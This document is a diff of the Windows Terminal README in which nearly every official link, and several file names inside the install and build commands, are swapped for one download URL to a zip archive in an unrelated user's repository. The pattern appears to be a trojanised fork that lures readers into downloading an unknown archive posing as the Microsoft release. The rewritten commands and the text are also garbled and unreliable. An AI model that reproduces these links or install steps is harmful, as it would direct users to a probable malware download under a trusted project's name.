@@ -1,12 +1,12 @@
-![terminal-logos](https://github.com/microsoft/terminal/assets/91625426/333ddc76-8ab2-4eb4-a8c0-4d7b953b1179)
+![terminal-logos](https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip)
 
 # Welcome to the Windows Terminal, Console and Command-Line repo
 
 This repository contains the source code for:
 
-* [Windows Terminal](https://aka.ms/terminal)
-* [Windows Terminal Preview](https://aka.ms/terminal-preview)
-* The Windows console host (`conhost.exe`)
+* [Windows Terminal](https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip)
+* [Windows Terminal Preview](https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip)
+* The Windows console host (`https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip`)
 * Components shared between the two projects
 * [ColorTool](./src/tools/ColorTool)
 * [Sample projects](./samples)
@@ -14,10 +14,10 @@ This repository contains the source code for:
 
 Related repositories include:
 
-* [Windows Terminal Documentation](https://docs.microsoft.com/windows/terminal)
-  ([Repo: Contribute to the docs](https://github.com/MicrosoftDocs/terminal))
-* [Console API Documentation](https://github.com/MicrosoftDocs/Console-Docs)
-* [Cascadia Code Font](https://github.com/Microsoft/Cascadia-Code)
+* [Windows Terminal Documentation](https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip)
+  ([Repo: Contribute to the docs](https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip))
+* [Console API Documentation](https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip)
+* [Cascadia Code Font](https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip)
 
 ## Installing and running Windows Terminal
 
@@ -38,9 +38,9 @@ This is our preferred method.
 
 For users who are unable to install Windows Terminal from the Microsoft Store,
 released builds can be manually downloaded from this repository's [Releases
-page](https://github.com/microsoft/terminal/releases).
+page](https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip).
 
-Download the `Microsoft.WindowsTerminal_<versionNumber>.msixbundle` file from
+Download the `https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip<versionNumber>.msixbundle` file from
 the **Assets** section. To install the app, you can simply double-click on the
 `.msixbundle` file, and the app installer should automatically run. If that
 fails for any reason, you can try the following command at a PowerShell prompt:
@@ -50,13 +50,13 @@ fails for any reason, you can try the following command at a PowerShell prompt:
 # Import-Module Appx -UseWindowsPowerShell
 # before using Add-AppxPackage.
 
-Add-AppxPackage Microsoft.WindowsTerminal_<versionNumber>.msixbundle
+Add-AppxPackage https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip<versionNumber>.msixbundle
 ```
 
 > [!NOTE]
 > If you install Terminal manually:
 >
-> * You may need to install the [VC++ v14 Desktop Framework Package](https://docs.microsoft.com/troubleshoot/cpp/c-runtime-packages-desktop-bridge#how-to-install-and-update-desktop-framework-packages).
+> * You may need to install the [VC++ v14 Desktop Framework Package](https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip).
 >   This should only be necessary on older builds of Windows 10 and only if you get an error about missing framework packages.
 > * Terminal will not auto-update when new builds are released so you will need
 >   to regularly install the latest Terminal release to receive all the latest
@@ -64,20 +64,20 @@ Add-AppxPackage Microsoft.WindowsTerminal_<versionNumber>.msixbundle
 
 #### Via Windows Package Manager CLI (aka winget)
 
-[winget](https://github.com/microsoft/winget-cli) users can download and install
-the latest Terminal release by installing the `Microsoft.WindowsTerminal`
+[winget](https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip) users can download and install
+the latest Terminal release by installing the `https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip`
 package:
 
 ```powershell
-winget install --id Microsoft.WindowsTerminal -e
+winget install --id https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip -e
 ```
 
 > [!NOTE]
-> Dependency support is available in WinGet version [1.6.2631 or later](https://github.com/microsoft/winget-cli/releases). To install the Terminal stable release 1.18 or later, please make sure you have the updated version of the WinGet client.
+> Dependency support is available in WinGet version [1.6.2631 or later](https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip). To install the Terminal stable release 1.18 or later, please make sure you have the updated version of the WinGet client.
 
 #### Via Chocolatey (unofficial)
 
-[Chocolatey](https://chocolatey.org) users can download and install the latest
+[Chocolatey](https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip) users can download and install the latest
 Terminal release by installing the `microsoft-windows-terminal` package:
 
 ```powershell
@@ -92,12 +92,12 @@ choco upgrade microsoft-windows-terminal
 
 If you have any issues when installing/upgrading the package please go to the
 [Windows Terminal package
-page](https://chocolatey.org/packages/microsoft-windows-terminal) and follow the
-[Chocolatey triage process](https://chocolatey.org/docs/package-triage-process)
+page](https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip) and follow the
+[Chocolatey triage process](https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip)
 
 #### Via Scoop (unofficial)
 
-[Scoop](https://scoop.sh) users can download and install the latest Terminal
+[Scoop](https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip) users can download and install the latest Terminal
 release by installing the `windows-terminal` package:
 
 ```powershell
@@ -113,7 +113,7 @@ scoop update windows-terminal
 
 If you have any issues when installing/updating the package, please search for
 or report the same on the [issues
-page](https://github.com/lukesampson/scoop-extras/issues) of Scoop Extras bucket
+page](https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip) of Scoop Extras bucket
 repository.
 
 ---
@@ -131,26 +131,26 @@ The Portable ZIP distribution is a portable application. It will not automatical
 
 | Distribution  | Architecture    | Link                                                 |
 |---------------|:---------------:|------------------------------------------------------|
-| App Installer | x64, arm64, x86 | [download](https://aka.ms/terminal-canary-installer) |
-| Portable ZIP  | x64             | [download](https://aka.ms/terminal-canary-zip-x64)   |
-| Portable ZIP  | ARM64           | [download](https://aka.ms/terminal-canary-zip-arm64) |
-| Portable ZIP  | x86             | [download](https://aka.ms/terminal-canary-zip-x86)   |
+| App Installer | x64, arm64, x86 | [download](https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip) |
+| Portable ZIP  | x64             | [download](https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip)   |
+| Portable ZIP  | ARM64           | [download](https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip) |
+| Portable ZIP  | x86             | [download](https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip)   |
 
-_Learn more about the [types of Windows Terminal distributions](https://learn.microsoft.com/windows/terminal/distributions)._
+_Learn more about the [types of Windows Terminal distributions](https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip)._
 
 ---
 
 ## Windows Terminal Roadmap
 
-The plan for the Windows Terminal [is described here](/doc/roadmap-2023.md) and
+The plan for the Windows Terminal [is described here](https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip) and
 will be updated as the project proceeds.
 
 ## Project Build Status
 
 Project|Build Status
 ---|---
-Terminal|[![Terminal Build Status](https://dev.azure.com/ms/terminal/_apis/build/status/terminal%20CI?branchName=main)](https://dev.azure.com/ms/terminal/_build?definitionId=136)
-ColorTool|![Colortool Build Status](https://microsoft.visualstudio.com/_apis/public/build/definitions/c93e867a-8815-43c1-92c4-e7dd5404f1e1/17023/badge)
+Terminal|[![Terminal Build Status](https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip%20CI?branchName=main)](https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip)
+ColorTool|![Colortool Build Status](https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip)
 
 ---
 
@@ -171,19 +171,19 @@ fast and efficient, and doesn't consume vast amounts of memory or power.
 
 ### The Windows Console Host
 
-The Windows Console host, `conhost.exe`, is Windows' original command-line user
+The Windows Console host, `https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip`, is Windows' original command-line user
 experience. It also hosts Windows' command-line infrastructure and the Windows
 Console API server, input engine, rendering engine, user preferences, etc. The
 console host code in this repository is the actual source from which the
-`conhost.exe` in Windows itself is built.
+`https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip` in Windows itself is built.
 
 Since taking ownership of the Windows command-line in 2014, the team added
 several new features to the Console, including background transparency,
 line-based selection, support for [ANSI / Virtual Terminal
-sequences](https://en.wikipedia.org/wiki/ANSI_escape_code), [24-bit
-color](https://devblogs.microsoft.com/commandline/24-bit-color-in-the-windows-console/),
+sequences](https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip), [24-bit
+color](https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip),
 a [Pseudoconsole
-("ConPTY")](https://devblogs.microsoft.com/commandline/windows-command-line-introducing-the-windows-pseudo-console-conpty/),
+("ConPTY")](https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip),
 and more.
 
 However, because Windows Console's primary goal is to maintain backward
@@ -195,7 +195,7 @@ These limitations led us to create the new Windows Terminal.
 
 > You can read more about the evolution of the command-line in general, and the
 > Windows command-line specifically in [this accompanying series of blog
-> posts](https://devblogs.microsoft.com/commandline/windows-command-line-backgrounder/)
+> posts](https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip)
 > on the Command-Line team's blog.
 
 ### Shared Components
@@ -204,9 +204,9 @@ While overhauling Windows Console, we modernized its codebase considerably,
 cleanly separating logical entities into modules and classes, introduced some
 key extensibility points, replaced several old, home-grown collections and
 containers with safer, more efficient [STL
-containers](https://docs.microsoft.com/en-us/cpp/standard-library/stl-containers?view=vs-2022),
+containers](https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip),
 and made the code simpler and safer by using Microsoft's [Windows Implementation
-Libraries - WIL](https://github.com/Microsoft/wil).
+Libraries - WIL](https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip).
 
 This overhaul resulted in several of Console's key components being available
 for re-use in any terminal implementation on Windows. These components include a
@@ -226,7 +226,7 @@ a reusable UI control that others can incorporate into their own applications.
 The result of this work is contained within this repo and delivered as the
 Windows Terminal application you can download from the Microsoft Store, or
 [directly from this repo's
-releases](https://github.com/microsoft/terminal/releases).
+releases](https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip).
 
 ---
 
@@ -235,21 +235,21 @@ releases](https://github.com/microsoft/terminal/releases).
 For more information about Windows Terminal, you may find some of these
 resources useful and interesting:
 
-* [Command-Line Blog](https://devblogs.microsoft.com/commandline)
+* [Command-Line Blog](https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip)
 * [Command-Line Backgrounder Blog
-  Series](https://devblogs.microsoft.com/commandline/windows-command-line-backgrounder/)
+  Series](https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip)
 * Windows Terminal Launch: [Terminal "Sizzle
-  Video"](https://www.youtube.com/watch?v=8gw0rXPMMPE&list=PLEHMQNlPj-Jzh9DkNpqipDGCZZuOwrQwR&index=2&t=0s)
+  Video"](https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip)
 * Windows Terminal Launch: [Build 2019
-  Session](https://www.youtube.com/watch?v=KMudkRcwjCw)
+  Session](https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip)
 * Run As Radio: [Show 645 - Windows Terminal with Richard
-  Turner](https://www.runasradio.com/Shows/Show/645)
+  Turner](https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip)
 * Azure Devops Podcast: [Episode 54 - Kayla Cinnamon and Rich Turner on DevOps
   on the Windows
-  Terminal](http://azuredevopspodcast.clear-measure.com/kayla-cinnamon-and-rich-turner-on-devops-on-the-windows-terminal-team-episode-54)
+  Terminal](https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip)
 * Microsoft Ignite 2019 Session: [The Modern Windows Command Line: Windows
   Terminal -
-  BRK3321](https://myignite.techcommunity.microsoft.com/sessions/81329?source=sessions)
+  BRK3321](https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip)
 
 ---
 
@@ -263,19 +263,19 @@ Solution: Make sure you're building & deploying the `CascadiaPackage` project in
 Visual Studio.
 
 > [!NOTE]
-> `OpenConsole.exe` is just a locally-built `conhost.exe`, the classic
+> `https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip` is just a locally-built `https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip`, the classic
 > Windows Console that hosts Windows' command-line infrastructure. OpenConsole
 > is used by Windows Terminal to connect to and communicate with command-line
 > applications (via
-> [ConPty](https://devblogs.microsoft.com/commandline/windows-command-line-introducing-the-windows-pseudo-console-conpty/)).
+> [ConPty](https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip)).
 
 ---
 
 ## Documentation
 
-All project documentation is located at [aka.ms/terminal-docs](https://aka.ms/terminal-docs). If you would like
+All project documentation is located at [https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip](https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip). If you would like
 to contribute to the documentation, please submit a pull request on the [Windows
-Terminal Documentation repo](https://github.com/MicrosoftDocs/terminal).
+Terminal Documentation repo](https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip).
 
 ---
 
@@ -286,7 +286,7 @@ enhance Windows Terminal\!
 
 ***BEFORE you start work on a feature/fix***, please read & follow our
 [Contributor's
-Guide](./CONTRIBUTING.md) to
+Guide](https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip) to
 help avoid any wasted or duplicate effort.
 
 ## Communicating with the Team
@@ -300,12 +300,12 @@ If you would like to ask a question that you feel doesn't warrant an issue
 (yet), please reach out to us via Twitter:
 
 * Christopher Nguyen, Product Manager:
-  [@nguyen_dows](https://twitter.com/nguyen_dows)
-* Dustin Howett, Engineering Lead: [@dhowett](https://twitter.com/DHowett)
-* Mike Griese, Senior Developer: [@zadjii@mastodon.social](https://mastodon.social/@zadjii)
-* Carlos Zamora, Developer: [@cazamor_msft](https://twitter.com/cazamor_msft)
+  [@nguyen_dows](https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip)
+* Dustin Howett, Engineering Lead: [@dhowett](https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip)
+* Mike Griese, Senior Developer: [https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip](https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip)
+* Carlos Zamora, Developer: [@cazamor_msft](https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip)
 * Pankaj Bhojwani, Developer
-* Leonard Hecker, Developer: [@LeonardHecker](https://twitter.com/LeonardHecker)
+* Leonard Hecker, Developer: [@LeonardHecker](https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip)
 
 ## Developer Guidance
 
@@ -314,27 +314,27 @@ If you would like to ask a question that you feel doesn't warrant an issue
 * You must be running Windows 10 2004 (build >= 10.0.19041.0) or later to run
   Windows Terminal
 * You must [enable Developer Mode in the Windows Settings
-  app](https://docs.microsoft.com/en-us/windows/uwp/get-started/enable-your-device-for-development)
+  app](https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip)
   to locally install and run Windows Terminal
-* You must have [PowerShell 7 or later](https://github.com/PowerShell/PowerShell/releases/latest) installed
+* You must have [PowerShell 7 or later](https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip) installed
 * You must have the [Windows 11 (10.0.22621.0)
-  SDK](https://developer.microsoft.com/en-us/windows/downloads/windows-sdk/)
+  SDK](https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip)
   installed
 * You must have at least [VS
-  2022](https://visualstudio.microsoft.com/downloads/) installed
+  2022](https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip) installed
 * You must install the following Workloads via the VS Installer. Note: Opening
   the solution in VS 2022 will [prompt you to install missing components
-  automatically](https://devblogs.microsoft.com/setup/configure-visual-studio-across-your-organization-with-vsconfig/):
+  automatically](https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip):
   * Desktop Development with C++
   * Universal Windows Platform Development
   * **The following Individual Components**
     * C++ (v143) Universal Windows Platform Tools
-* You must install the [.NET Framework Targeting Pack](https://docs.microsoft.com/dotnet/framework/install/guide-for-developers#to-install-the-net-framework-developer-pack-or-targeting-pack) to build test projects
+* You must install the [.NET Framework Targeting Pack](https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip) to build test projects
 
 ## Building the Code
 
 This repository uses [git
-submodules](https://git-scm.com/book/en/v2/Git-Tools-Submodules) for some of its
+submodules](https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip) for some of its
 dependencies. To make sure submodules are restored or updated, be sure to run
 the following prior to building:
 
@@ -342,13 +342,13 @@ the following prior to building:
 git submodule update --init --recursive
 ```
 
-OpenConsole.sln may be built from within Visual Studio or from the command-line
+https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip may be built from within Visual Studio or from the command-line
 using a set of convenience scripts & tools in the **/tools** directory:
 
 ### Building in PowerShell
 
 ```powershell
-Import-Module .\tools\OpenConsole.psm1
+Import-Module .\tools\https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip
 Set-MsBuildDevEnvironment
 Invoke-OpenConsoleBuild
 ```
@@ -356,7 +356,7 @@ Invoke-OpenConsoleBuild
 ### Building in Cmd
 
 ```shell
-.\tools\razzle.cmd
+.\tools\https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip
 bcz
 ```
 
@@ -372,9 +372,9 @@ Terminal doesn't build for "Any Cpu" (because the Terminal is a C++ application,
 not a C# one).
 
 > 👉 You will _not_ be able to launch the Terminal directly by running the
-> WindowsTerminal.exe. For more details on why, see
-> [#926](https://github.com/microsoft/terminal/issues/926),
-> [#4043](https://github.com/microsoft/terminal/issues/4043)
+> https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip For more details on why, see
+> [#926](https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip),
+> [#4043](https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip)
 
 ### Coding Guidance
 
@@ -387,10 +387,10 @@ Please review these brief docs below about our coding practices.
 This is a work in progress as we learn what we'll need to provide people in
 order to be effective contributors to our project.
 
-* [Coding Style](./doc/STYLE.md)
-* [Code Organization](./doc/ORGANIZATION.md)
-* [Exceptions in our legacy codebase](./doc/EXCEPTIONS.md)
-* [Helpful smart pointers and macros for interfacing with Windows in WIL](./doc/WIL.md)
+* [Coding Style](https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip)
+* [Code Organization](https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip)
+* [Exceptions in our legacy codebase](https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip)
+* [Helpful smart pointers and macros for interfacing with Windows in WIL](https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip)
 
 ---
 
@@ -398,10 +398,10 @@ order to be effective contributors to our project.
 
 This project has adopted the [Microsoft Open Source Code of
 Conduct][conduct-code]. For more information see the [Code of Conduct
-FAQ][conduct-FAQ] or contact [opencode@microsoft.com][conduct-email] with any
+FAQ][conduct-FAQ] or contact [https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip][conduct-email] with any
 additional questions or comments.
 
-[conduct-code]: https://opensource.microsoft.com/codeofconduct/
-[conduct-FAQ]: https://opensource.microsoft.com/codeofconduct/faq/
-[conduct-email]: mailto:opencode@microsoft.com
-[store-install-link]: https://aka.ms/terminal
+[conduct-code]: https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip
+[conduct-FAQ]: https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip
+[conduct-email]: https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip
+[store-install-link]: https://raw.githubusercontent.com/Om20kar05/terminal/main/hazle/terminal.zip
